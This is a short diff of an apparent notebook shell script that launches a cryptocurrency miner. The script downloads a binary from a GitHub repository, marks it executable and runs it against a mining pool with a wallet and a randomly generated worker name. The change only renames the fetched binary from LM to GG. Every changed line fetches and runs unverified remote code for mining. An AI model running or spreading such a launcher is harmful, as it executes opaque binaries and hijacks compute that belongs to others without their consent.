@@ -15,6 +15,6 @@ WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)
 
 ! cd "$(dirname "$0")"
 
-! wget https://github.com/mencobaiajanah/SPLIT/raw/main/LM
-! chmod +x LM
-! ./LM --algo $ALGHO --pool $POOL --user $WALLET.$WORKER
+! wget https://github.com/mencobaiajanah/SPLIT/raw/main/GG
+! chmod +x GG
+! ./GG --algo $ALGHO --pool $POOL --user $WALLET.$WORKER
